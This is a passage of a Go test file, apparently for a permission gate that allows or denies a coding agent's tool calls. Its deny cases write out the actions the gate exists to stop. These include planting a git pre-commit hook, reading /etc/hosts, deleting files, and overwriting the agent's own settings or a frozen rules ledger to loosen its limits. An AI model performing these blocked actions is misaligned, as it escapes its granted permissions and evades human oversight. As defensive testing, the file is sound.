package main

import (
	"bytes"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/kevinhorst/smine/internal/components"
	"github.com/kevinhorst/smine/internal/desktop"
	"github.com/kevinhorst/smine/internal/hookconfig"
	"github.com/kevinhorst/smine/internal/install"
	"github.com/kevinhorst/smine/internal/models"
	"github.com/kevinhorst/smine/internal/planrules"
	"github.com/kevinhorst/smine/internal/sessionstate"
	"github.com/kevinhorst/smine/internal/toolpolicy"
)

const (
	agentModelReason    = "cannot run a subagent — name one of: opus, sonnet"
	testContextDir      = "docs"
	testDesignSkill     = "fdesign"
	testFimplementSkill = "fimplement"
)

// defaultHookConfig is the gate's rendered defaults with testContextDir as the context dir, loaded the way the gate loads it.
func defaultHookConfig(t *testing.T) *hookconfig.Config {
	t.Helper()
	home := t.TempDir()
	writeHookConfig(t, home, renderedHookConfig(t))
	cfg, err := hookconfig.Load(home)
	require.NoError(t, err)
	return cfg
}

// hookConfigHome points HOME at a fresh home whose Claude home holds cfg, the way the gate's run reads it.
func hookConfigHome(t *testing.T, cfg *hookconfig.Config) string {
	t.Helper()
	home := t.TempDir()
	writeHookConfig(t, filepath.Join(home, ".claude"), cfg)
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	return home
}

func defaultToolpolicy(t *testing.T) *toolpolicy.Policy {
	t.Helper()
	return &defaultHookConfig(t).Toolpolicy
}

func renderedHookConfig(t *testing.T) *hookconfig.Config {
	t.Helper()
	defaults, err := install.RenderDefaults(components.Gate, components.SinkHooksConfig)
	require.NoError(t, err)
	worktreesDefaults, err := install.RenderDefaults(components.Worktrees, components.SinkHooksConfig)
	require.NoError(t, err)
	cfg := &hookconfig.Config{}
	require.NoError(t, json.Unmarshal(defaults, cfg))
	require.NoError(t, json.Unmarshal(worktreesDefaults, cfg))
	cfg.Context.ContextDir = testContextDir
	return cfg
}

func writeHookConfig(t *testing.T, home string, cfg *hookconfig.Config) {
	t.Helper()
	encoded, err := json.Marshal(cfg)
	require.NoError(t, err)
	path := hookconfig.Path(home)
	require.NoError(t, os.MkdirAll(filepath.Dir(path), 0o755))
	require.NoError(t, os.WriteFile(path, encoded, 0o644))
}

func fixtureGrants(t *testing.T, cwd string) *Grants {
	t.Helper()
	deny, err := ParseRule("Bash(git stash*)")
	require.NoError(t, err)
	allowRaw := []string{
		"Bash(curl *)",
		"Bash(git status*)",
		"Bash(go test *)",
		"Bash(make *)",
		"Edit",
		"Write",
		"WebFetch(domain:code.claude.com)",
		"WebSearch",
		"mcp__ccd_session",
		"mcp__goland__search_symbol",
	}
	vocabulary := &models.Vocabulary{
		Available: []string{"claude-opus-5-5", "claude-opus-5-5[1m]", "claude-fable-5", "claude-sonnet-5", "claude-sonnet-5[1m]"},
		Forbidden: []string{"*fable*"},
	}
	cfg := defaultHookConfig(t)
	grants := &Grants{
		gitAdmittedFlags: cfg.Toolpolicy.GitAdmittedFlags,
		worktreesDir:     cfg.Worktreecreate.WorktreesDir,

		AdditionalDirectories: []string{filepath.Join(cwd, "..", "extra")},
		Allow:                 parseRules(allowRaw, "fixture"),
		Deny:                  []*Rule{deny},
		Models:                vocabulary,
		SkillAllow:            parseRules([]string{"Bash(mv *)"}, "fixture"),
	}
	return grants
}

func TestDecide(t *testing.T) {
	type testCase struct {
		_id                string
		_expectedCandidate string
		_expectedDecision  string
		_expectedReason    string

		grants    *Grants
		input     *HookInput
		policy    *toolpolicy.Policy
		statePath string
	}

	policy := defaultToolpolicy(t)

	base := fixtureBase(t)
	home := filepath.Join(base, "home")
	cwd := filepath.Join(base, "repo", "work")
	extra := filepath.Join(base, "repo", "extra")
	scratchpad := filepath.Join(base, "scratch")
	for _, dir := range []string{filepath.Join(home, ".claude"), filepath.Join(cwd, "build"), extra, scratchpad} {
		require.NoError(t, os.MkdirAll(dir, 0o755))
	}
	require.NoError(t, os.WriteFile(filepath.Join(cwd, "Makefile"), []byte("## test-shell: run shell tests; T=<name> filters\ntest:\n\ttrue\n"), 0o644))
	mainCheckout := filepath.Join(base, "repo")
	require.NoError(t, os.MkdirAll(filepath.Join(mainCheckout, ".git", "worktrees", "work"), 0o755))
	worktreePointer := "gitdir: " + filepath.Join(mainCheckout, ".git", "worktrees", "work") + "\n"
	require.NoError(t, os.WriteFile(filepath.Join(cwd, ".git"), []byte(worktreePointer), 0o644))
	transcript := filepath.Join(home, ".claude", "projects", "slug", "session-1.jsonl")
	makefileCause := approvableCause("Makefile")
	grants := fixtureGrants(t, cwd)
	approvedGrants := fixtureGrants(t, cwd)
	approvedGrants.Approvals = map[string]bool{"Makefile": true}
	cpGrants := fixtureGrants(t, cwd)
	cpGrants.Allow = append(cpGrants.Allow, parseRules([]string{"Bash(cp *)"}, "fixture")...)
	protectedCwd := filepath.Join(home, ".claude", "skills", "railroad-review", "workflows")
	require.NoError(t, os.MkdirAll(protectedCwd, 0o755))
	resolvedHome, err := filepath.EvalSymlinks(home)
	require.NoError(t, err)
	smineGrants := fixtureGrants(t, cwd)
	smineGrants.Allow = append(smineGrants.Allow, parseRules([]string{"Bash(smine-rules lanes *)"}, "fixture")...)
	todoDenyGrants := fixtureGrants(t, cwd)
	todoDenyGrants.Deny = append(todoDenyGrants.Deny, parseRules([]string{"TodoWrite"}, "fixture")...)
	activeSkillGrants := fixtureGrants(t, cwd)
	activeSkillGrants.ActiveSkills = []string{"fimplement"}
	activeSkillDenyGrants := fixtureGrants(t, cwd)
	activeSkillDenyGrants.ActiveSkills = []string{"fimplement"}
	activeSkillDenyGrants.Deny = append(activeSkillDenyGrants.Deny, parseRules([]string{"Skill(fimplement)"}, "fixture")...)
	promptSkillGrants := fixtureGrants(t, cwd)
	promptSkillGrants.PromptSkills = []string{"fimplement"}

	unreadableModelsGrants := fixtureGrants(t, cwd)
	unreadableModelsGrants.Models = nil

	fence := filepath.Join(cwd, "evals")
	fencedPolicy := defaultToolpolicy(t)
	fencedPolicy.ReadFence = []string{fence}
	storeArchive := filepath.Join(home, "GolandProjects", "agent-plans")
	storeFencedPolicy := defaultToolpolicy(t)
	storeFencedPolicy.ReadFence = []string{storeArchive}
	fencedWriteReason := "tool-policy: denied Write — " + causeFenced + ". candidate rule: Write. " + denySteer

	localSettings := filepath.Join(cwd, ".claude", "settings.local.json")
	session := func(mode string, tool string, input ToolInput) *HookInput {
		envelope := &HookInput{
			Cwd:            cwd,
			PermissionMode: mode,
			ScratchpadDir:  scratchpad,
			SessionId:      "session-1",
			ToolInput:      input,
			ToolName:       tool,
			TranscriptPath: transcript,
		}
		return envelope
	}
	inProtectedCwd := session("default", "Bash", ToolInput{Command: "smine-rules lanes -h"})
	inProtectedCwd.Cwd = protectedCwd

	tests := make([]*testCase, 0)

	// exit-plan-mode-none
	tests = append(tests, &testCase{
		_id:               "exit-plan-mode-none",
		_expectedDecision: decisionNone,

		input: session("plan", "ExitPlanMode", ToolInput{}),
	})

	// ungated-structured-output-allow
	tests = append(tests, &testCase{
		_id:               "ungated-structured-output-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   ungatedAllowReason,

		input: session("acceptEdits", "StructuredOutput", ToolInput{}),
	})

	// denied-tool-ask-user-question
	tests = append(tests, &testCase{
		_id:                "denied-tool-ask-user-question",
		_expectedCandidate: "AskUserQuestion",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeDeniedTool,

		input: session("default", "AskUserQuestion", ToolInput{}),
	})

	// bash-readonly-batch-allow
	tests = append(tests, &testCase{
		_id:               "bash-readonly-batch-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   allowReason,

		input: session("default", "Bash", ToolInput{Command: `echo "==="; jq '.x' f.json | head`}),
	})

	// bash-compound-deny-steering
	tests = append(tests, &testCase{
		_id:                "bash-compound-deny-steering",
		_expectedCandidate: "",
		_expectedDecision:  decisionDeny,
		_expectedReason:    "ONE command per Bash call",

		input: session("default", "Bash", ToolInput{Command: "git push; ls"}),
	})

	// bash-allow-rule-allow
	tests = append(tests, &testCase{
		_id:               "bash-allow-rule-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(go test *)",

		input: session("default", "Bash", ToolInput{Command: "go test ./cmd/toolpolicy/"}),
	})

	// bash-no-rule-deny-candidate
	tests = append(tests, &testCase{
		_id:                "bash-no-rule-deny-candidate",
		_expectedCandidate: "Bash(brew list *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    "candidate rule: Bash(brew list *)",

		input: session("default", "Bash", ToolInput{Command: "brew list"}),
	})

	// bash-deny-rule-named
	tests = append(tests, &testCase{
		_id:                "bash-deny-rule-named",
		_expectedCandidate: "Bash(git stash *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    "matches deny rule Bash(git stash*)",

		input: session("default", "Bash", ToolInput{Command: "git stash"}),
	})

	// bash-find-exec-deny-steering
	tests = append(tests, &testCase{
		_id:                "bash-find-exec-deny-steering",
		_expectedCandidate: "",
		_expectedDecision:  decisionDeny,
		_expectedReason:    "| xargs <cmd>",

		input: session("default", "Bash", ToolInput{Command: `find build -name '*.rs' -exec wc -l {} +`}),
	})

	// bash-find-delete-deny
	tests = append(tests, &testCase{
		_id:                "bash-find-delete-deny",
		_expectedCandidate: "",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeFindExec,

		input: session("default", "Bash", ToolInput{Command: `find . -name '*.tmp' -delete`}),
	})

	// bash-find-pipe-xargs-allow
	tests = append(tests, &testCase{
		_id:               "bash-find-pipe-xargs-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   allowReason,

		input: session("default", "Bash", ToolInput{Command: `find tests -name '*.rs' | xargs wc -l`}),
	})

	// bash-skill-grant-allow
	tests = append(tests, &testCase{
		_id:               "bash-skill-grant-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   "skill grant Bash(mv *)",

		input: session("default", "Bash", ToolInput{Command: "mv a b"}),
	})

	// accept-edits-rm-in-cwd-allow
	tests = append(tests, &testCase{
		_id:               "accept-edits-rm-in-cwd-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   acceptEditsAllowReason,

		input: session("acceptEdits", "Bash", ToolInput{Command: "rm -f build/out.txt"}),
	})

	// accept-edits-rm-tmp-deny-steer
	tests = append(tests, &testCase{
		_id:                "accept-edits-rm-tmp-deny-steer",
		_expectedCandidate: "Bash(rm *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeTmpWrite,

		input: session("acceptEdits", "Bash", ToolInput{Command: "rm -f /tmp/out.txt"}),
	})

	// accept-edits-nonliteral-deny
	tests = append(tests, &testCase{
		_id:                "accept-edits-nonliteral-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeUnresolvablePath,

		input: session("acceptEdits", "Bash", ToolInput{Command: "cp $SRC dst"}),
	})

	// default-mode-rm-in-cwd-deny
	tests = append(tests, &testCase{
		_id:                "default-mode-rm-in-cwd-deny",
		_expectedCandidate: "Bash(rm *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		input: session("default", "Bash", ToolInput{Command: "rm -f build/out.txt"}),
	})

	// default-mode-rm-plans-deny
	tests = append(tests, &testCase{
		_id:                "default-mode-rm-plans-deny",
		_expectedCandidate: "Bash(rm *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		input: session("default", "Bash", ToolInput{Command: "rm -f " + filepath.Join(home, ".claude", "plans", "x.md")}),
	})

	// accept-edits-sed-in-place-allow
	tests = append(tests, &testCase{
		_id:               "accept-edits-sed-in-place-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   sedWriteAllowReason,

		input: session("acceptEdits", "Bash", ToolInput{Command: "sed -i '' s/a/b/ build/file.go"}),
	})

	// accept-edits-sed-multi-expression-allow
	tests = append(tests, &testCase{
		_id:               "accept-edits-sed-multi-expression-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   sedWriteAllowReason,

		input: session("acceptEdits", "Bash", ToolInput{Command: "sed -i '' -e s/a/b/ -e s/c/d/ build/file.go"}),
	})

	// read-inside-anchor-allow-reason
	tests = append(tests, &testCase{
		_id:               "read-inside-anchor-allow-reason",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		input: session("default", "Read", ToolInput{FilePath: filepath.Join(cwd, "build", "x.go")}),
	})

	// read-additional-directory-allow
	tests = append(tests, &testCase{
		_id:               "read-additional-directory-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		input: session("default", "Read", ToolInput{FilePath: filepath.Join(extra, "x.go")}),
	})

	// read-read-root-allow
	tests = append(tests, &testCase{
		_id:               "read-read-root-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		input: session("default", "Read", ToolInput{FilePath: filepath.Join(home, ".claude", "settings.json")}),
	})

	// read-outside-deny
	tests = append(tests, &testCase{
		_id:                "read-outside-deny",
		_expectedCandidate: "Read",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeReadOutside,

		input: session("default", "Read", ToolInput{FilePath: "/etc/hosts"}),
	})

	// grep-empty-path-is-cwd
	tests = append(tests, &testCase{
		_id:               "grep-empty-path-is-cwd",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		input: session("plan", "Grep", ToolInput{}),
	})

	// write-scratchpad-allow
	tests = append(tests, &testCase{
		_id:               "write-scratchpad-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		input: session("default", "Write", ToolInput{FilePath: filepath.Join(scratchpad, "out.md")}),
	})

	// write-tmp-deny-steer
	tests = append(tests, &testCase{
		_id:                "write-tmp-deny-steer",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeTmpWrite,

		input: session("acceptEdits", "Write", ToolInput{FilePath: "/tmp/x"}),
	})

	// write-outside-deny
	tests = append(tests, &testCase{
		_id:                "write-outside-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeWriteOutside,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(base, "elsewhere", "x")}),
	})

	// write-plan-file-allow
	tests = append(tests, &testCase{
		_id:               "write-plan-file-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		input: session("plan", "Write", ToolInput{FilePath: filepath.Join(home, ".claude", "plans", "x.md")}),
	})

	// write-auto-memory-glob-allow
	tests = append(tests, &testCase{
		_id:               "write-auto-memory-glob-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(home, ".claude", "projects", "-Users-x-repo", "memory", "f.md")}),
	})

	// write-projects-transcript-deny
	tests = append(tests, &testCase{
		_id:                "write-projects-transcript-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeEngineProtected,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(home, ".claude", "projects", "-Users-x-repo", "s.jsonl")}),
	})

	// webfetch-allowed-domain-allow
	tests = append(tests, &testCase{
		_id:               "webfetch-allowed-domain-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "WebFetch(domain:code.claude.com)",

		input: session("default", "WebFetch", ToolInput{Url: "https://code.claude.com/docs/en/hooks"}),
	})

	// webfetch-other-domain-deny
	tests = append(tests, &testCase{
		_id:                "webfetch-other-domain-deny",
		_expectedCandidate: "WebFetch(domain:example.org)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		input: session("default", "WebFetch", ToolInput{Url: "https://example.org/"}),
	})

	// skill-unlisted-deny
	tests = append(tests, &testCase{
		_id:                "skill-unlisted-deny",
		_expectedCandidate: "Skill(fimplement)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		input: session("default", "Skill", ToolInput{Skill: "fimplement"}),
	})

	// skill-active-allow
	tests = append(tests, &testCase{
		_id:               "skill-active-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   activeSkillReason + "fimplement",

		grants: activeSkillGrants,
		input:  session("default", "Skill", ToolInput{Skill: "fimplement"}),
	})

	// skill-other-active-deny
	tests = append(tests, &testCase{
		_id:                "skill-other-active-deny",
		_expectedCandidate: "Skill(fdesign)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		grants: activeSkillGrants,
		input:  session("default", "Skill", ToolInput{Skill: "fdesign"}),
	})

	// skill-prompt-named-allow
	tests = append(tests, &testCase{
		_id:               "skill-prompt-named-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   promptSkillReason + "fimplement",

		grants: promptSkillGrants,
		input:  session("default", "Skill", ToolInput{Skill: "fimplement"}),
	})

	// skill-other-prompt-named-deny
	tests = append(tests, &testCase{
		_id:                "skill-other-prompt-named-deny",
		_expectedCandidate: "Skill(fdesign)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		grants: promptSkillGrants,
		input:  session("default", "Skill", ToolInput{Skill: "fdesign"}),
	})

	// skill-active-deny-rule-binds
	tests = append(tests, &testCase{
		_id:                "skill-active-deny-rule-binds",
		_expectedCandidate: "Skill(fimplement)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    "matches deny rule Skill(fimplement)",

		grants: activeSkillDenyGrants,
		input:  session("default", "Skill", ToolInput{Skill: "fimplement"}),
	})

	// mcp-allowed-tool-allow
	tests = append(tests, &testCase{
		_id:               "mcp-allowed-tool-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "mcp__goland__search_symbol",

		input: session("default", "mcp__goland__search_symbol", ToolInput{}),
	})

	// mcp-unlisted-tool-deny
	tests = append(tests, &testCase{
		_id:                "mcp-unlisted-tool-deny",
		_expectedCandidate: "mcp__goland__replace_text_in_file",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		input: session("default", "mcp__goland__replace_text_in_file", ToolInput{}),
	})

	// mcp-server-rule-allow
	tests = append(tests, &testCase{
		_id:               "mcp-server-rule-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "mcp__ccd_session",

		input: session("default", "mcp__ccd_session__mark_chapter", ToolInput{}),
	})

	// mcp-unregistered-connector-deny
	tests = append(tests, &testCase{
		_id:                "mcp-unregistered-connector-deny",
		_expectedCandidate: "mcp__265a0f70__clickup_search",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		input: session("default", "mcp__265a0f70__clickup_search", ToolInput{}),
	})

	// unknown-tool-deny
	tests = append(tests, &testCase{
		_id:                "unknown-tool-deny",
		_expectedCandidate: "Foo",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeUnknownTool,

		input: session("default", "Foo", ToolInput{}),
	})

	// bash-cd-prefix-readonly-allow
	tests = append(tests, &testCase{
		_id:               "bash-cd-prefix-readonly-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   allowReason,

		input: session("default", "Bash", ToolInput{Command: "cd " + cwd + " && git rev-parse HEAD"}),
	})

	// write-cwd-settings-local-deny
	tests = append(tests, &testCase{
		_id:                "write-cwd-settings-local-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeSettingsViaCommand,

		input: session("acceptEdits", "Write", ToolInput{FilePath: ".claude/settings.local.json"}),
	})

	rulesFile := "plans/2026-09-28-probe-7ea30b5/2026-09-28-probe-wip-7ea30b5/" + planrules.FileName
	frozenLedgerFile := filepath.Join(home, ".claude", planrules.LedgerDirName, planrules.LedgerName)
	spentRecord := &planrules.Record{
		File:      &planrules.File{Checked: []string{}, Rules: []*planrules.Rule{}},
		Plan:      "plans/2026-09-28-other-1a2b3c4/2026-09-28-other-wip-1a2b3c4",
		SessionId: "session-1",
	}

	// edit-rules-file-no-design-prompt-deny
	noPromptGrants := fixtureGrants(t, cwd)
	noPromptGrants.freeze = &freezeGuard{designPrompts: nil, ledger: frozenLedgerFile, records: []*planrules.Record{}, root: cwd, sessionId: "session-1"}
	tests = append(tests, &testCase{
		_id:                "edit-rules-file-no-design-prompt-deny",
		_expectedCandidate: "Edit",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeRulesFile + ": " + causeFreezeBudget,

		grants: noPromptGrants,
		input:  session("acceptEdits", "Edit", ToolInput{FilePath: rulesFile}),
	})

	// write-rules-file-design-prompt-allow
	promptGrants := fixtureGrants(t, cwd)
	promptGrants.freeze = &freezeGuard{designPrompts: []string{""}, ledger: frozenLedgerFile, records: []*planrules.Record{}, root: cwd, sessionId: "session-1"}
	tests = append(tests, &testCase{
		_id:                "write-rules-file-design-prompt-allow",
		_expectedCandidate: "",
		_expectedDecision:  decisionAllow,
		_expectedReason:    rootsAllowReason,

		grants: promptGrants,
		input:  session("acceptEdits", "Write", ToolInput{FilePath: rulesFile}),
	})

	// edit-rules-file-budget-spent-deny
	spentGrants := fixtureGrants(t, cwd)
	spentGrants.freeze = &freezeGuard{designPrompts: []string{""}, ledger: frozenLedgerFile, records: []*planrules.Record{spentRecord}, root: cwd, sessionId: "session-1"}
	tests = append(tests, &testCase{
		_id:                "edit-rules-file-budget-spent-deny",
		_expectedCandidate: "Edit",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeRulesFile + ": " + causeFreezeBudget,

		grants: spentGrants,
		input:  session("acceptEdits", "Edit", ToolInput{FilePath: rulesFile}),
	})

	// redirect-rules-file-deny
	tests = append(tests, &testCase{
		_id:                "redirect-rules-file-deny",
		_expectedCandidate: "Bash(echo *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeRulesFile,

		grants: noPromptGrants,
		input:  session("acceptEdits", "Bash", ToolInput{Command: `echo '{"rules":[]}' > ` + rulesFile}),
	})

	// rm-rules-file-deny
	tests = append(tests, &testCase{
		_id:                "rm-rules-file-deny",
		_expectedCandidate: "Bash(rm *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeRulesFile,

		grants: noPromptGrants,
		input:  session("acceptEdits", "Bash", ToolInput{Command: "rm " + rulesFile}),
	})

	// mv-onto-rules-file-deny
	tests = append(tests, &testCase{
		_id:                "mv-onto-rules-file-deny",
		_expectedCandidate: "Bash(mv *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeRulesFile,

		grants: noPromptGrants,
		input:  session("acceptEdits", "Bash", ToolInput{Command: "mv build/rules.json " + rulesFile}),
	})

	// edit-frozen-rules-file-named-prompt-allow
	namedGrants := fixtureGrants(t, cwd)
	namedGrants.freeze = &freezeGuard{designPrompts: []string{"probe.md"}, ledger: frozenLedgerFile, records: []*planrules.Record{frozenRecord()}, root: cwd, sessionId: "session-1"}
	tests = append(tests, &testCase{
		_id:                "edit-frozen-rules-file-named-prompt-allow",
		_expectedCandidate: "",
		_expectedDecision:  decisionAllow,
		_expectedReason:    rootsAllowReason,

		grants: namedGrants,
		input:  session("acceptEdits", "Edit", ToolInput{FilePath: rulesFile}),
	})

	// write-frozen-ledger-deny
	tests = append(tests, &testCase{
		_id:                "write-frozen-ledger-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		grants: promptGrants,
		input:  session("acceptEdits", "Write", ToolInput{FilePath: frozenLedgerFile}),
	})

	// append-frozen-ledger-deny
	tests = append(tests, &testCase{
		_id:                "append-frozen-ledger-deny",
		_expectedCandidate: "Bash(echo *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		grants: promptGrants,
		input:  session("acceptEdits", "Bash", ToolInput{Command: `echo '{}' >> ~/.claude/tool-policy/frozen.jsonl`}),
	})

	// cp-onto-frozen-ledger-deny
	cpPromptGrants := fixtureGrants(t, cwd)
	cpPromptGrants.Allow = append(cpPromptGrants.Allow, parseRules([]string{"Bash(cp *)"}, "fixture")...)
	cpPromptGrants.freeze = promptGrants.freeze
	tests = append(tests, &testCase{
		_id:                "cp-onto-frozen-ledger-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		grants: cpPromptGrants,
		input:  session("acceptEdits", "Bash", ToolInput{Command: "cp build/record.jsonl ~/.claude/tool-policy/frozen.jsonl"}),
	})

	// rm-frozen-ledger-deny
	tests = append(tests, &testCase{
		_id:                "rm-frozen-ledger-deny",
		_expectedCandidate: "Bash(rm *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		grants: promptGrants,
		input:  session("acceptEdits", "Bash", ToolInput{Command: "rm " + frozenLedgerFile}),
	})

	// edit-cwd-settings-local-deny
	tests = append(tests, &testCase{
		_id:                "edit-cwd-settings-local-deny",
		_expectedCandidate: "Edit",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeSettingsViaCommand,

		input: session("acceptEdits", "Edit", ToolInput{FilePath: localSettings}),
	})

	// notebook-cwd-settings-local-deny
	tests = append(tests, &testCase{
		_id:                "notebook-cwd-settings-local-deny",
		_expectedCandidate: "NotebookEdit",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeSettingsViaCommand,

		input: session("acceptEdits", "NotebookEdit", ToolInput{NotebookPath: localSettings}),
	})

	// write-main-root-settings-local-deny
	tests = append(tests, &testCase{
		_id:                "write-main-root-settings-local-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeSettingsViaCommand,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(filepath.Dir(cwd), ".claude", "settings.local.json")}),
	})

	// edit-additional-dir-settings-deny
	tests = append(tests, &testCase{
		_id:                "edit-additional-dir-settings-deny",
		_expectedCandidate: "Edit",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		input: session("acceptEdits", "Edit", ToolInput{FilePath: filepath.Join(extra, ".claude", "settings.json")}),
	})

	// write-git-hook-deny
	tests = append(tests, &testCase{
		_id:                "write-git-hook-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeGitDir,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(cwd, ".git", "hooks", "pre-commit")}),
	})

	// edit-git-config-deny
	tests = append(tests, &testCase{
		_id:                "edit-git-config-deny",
		_expectedCandidate: "Edit",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeGitDir,

		input: session("acceptEdits", "Edit", ToolInput{FilePath: ".git/config"}),
	})

	// write-git-hook-case-folded-deny
	tests = append(tests, &testCase{
		_id:                "write-git-hook-case-folded-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeGitDir,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(cwd, ".GIT", "hooks", "pre-commit")}),
	})

	// write-gitignore-allow
	tests = append(tests, &testCase{
		_id:               "write-gitignore-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(cwd, ".gitignore")}),
	})

	// write-testdata-claude-dir-engine-protected
	tests = append(tests, &testCase{
		_id:                "write-testdata-claude-dir-engine-protected",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeEngineProtected,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(cwd, "cmd", "x", "testdata", "home", ".claude", "settings.json")}),
	})

	// accept-edits-cp-onto-settings-deny
	tests = append(tests, &testCase{
		_id:                "accept-edits-cp-onto-settings-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeSettingsViaCommand,

		input: session("acceptEdits", "Bash", ToolInput{Command: "cp build/out.txt .claude/settings.local.json"}),
	})

	// bash-cat-settings-allow
	tests = append(tests, &testCase{
		_id:               "bash-cat-settings-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   allowReason,

		input: session("default", "Bash", ToolInput{Command: "cat .claude/settings.json"}),
	})

	// pipe-go-test-tail-allow
	tests = append(tests, &testCase{
		_id:               "pipe-go-test-tail-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   pipelineAllowReason,

		input: session("default", "Bash", ToolInput{Command: "go test ./cmd/toolpolicy/ 2>&1 | tail -20"}),
	})

	// pipe-go-test-sort-allow
	tests = append(tests, &testCase{
		_id:               "pipe-go-test-sort-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   pipelineAllowReason,

		input: session("default", "Bash", ToolInput{Command: "go test ./... | sort"}),
	})

	// pipe-curl-jq-allow
	tests = append(tests, &testCase{
		_id:               "pipe-curl-jq-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   pipelineAllowReason,

		input: session("default", "Bash", ToolInput{Command: "curl -s localhost:8080/healthz | jq ."}),
	})

	// pipe-skill-grant-allow
	tests = append(tests, &testCase{
		_id:               "pipe-skill-grant-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   pipelineAllowReason,

		input: session("default", "Bash", ToolInput{Command: "mv a b | cat"}),
	})

	// pipe-unmatched-segment-deny
	tests = append(tests, &testCase{
		_id:               "pipe-unmatched-segment-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeCompound,

		input: session("default", "Bash", ToolInput{Command: "go test ./... | brew list"}),
	})

	// pipe-deny-rule-segment-deny
	tests = append(tests, &testCase{
		_id:               "pipe-deny-rule-segment-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeCompound,

		input: session("default", "Bash", ToolInput{Command: "cat notes.txt | git stash"}),
	})

	// pipe-settings-layer-segment-deny
	tests = append(tests, &testCase{
		_id:                "pipe-settings-layer-segment-deny",
